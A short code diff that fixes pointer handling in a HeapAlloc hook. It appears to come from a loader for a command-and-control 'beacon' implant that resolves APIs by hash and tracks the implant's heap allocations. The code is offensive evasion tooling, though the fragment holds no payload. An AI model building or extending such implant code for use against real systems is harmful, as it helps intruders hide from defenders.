@@ -53,7 +53,7 @@ D_SEC( D ) PVOID WINAPI HeapAlloc_Hook( _In_ HANDLE ProcessHeap, _In_ ULONG Flag
 	Api.RtlFreeHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );
 
 	/* Table header */
-	Tbl = C_PTR( *( PVOID * )( G_SYM( Table ) ) );
+	Tbl = C_PTR( G_SYM( Table ) );
 
 	/* Create a entry to hold information about the allocation */
 	if ( ( Ent = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( HEAP_ENTRY_BEACON ) ) ) != NULL ) {
@@ -64,7 +64,7 @@ D_SEC( D ) PVOID WINAPI HeapAlloc_Hook( _In_ HANDLE ProcessHeap, _In_ ULONG Flag
 			Ent->Length = U_PTR( Length );
 
 			/* Insert into the heap list */
-			InsertHeadList( &Tbl->HeapList, &Ent->HeapList );
+			InsertHeadList( &Tbl->Table->HeapList, &Ent->HeapList );
 		} 
 		else 
 		{
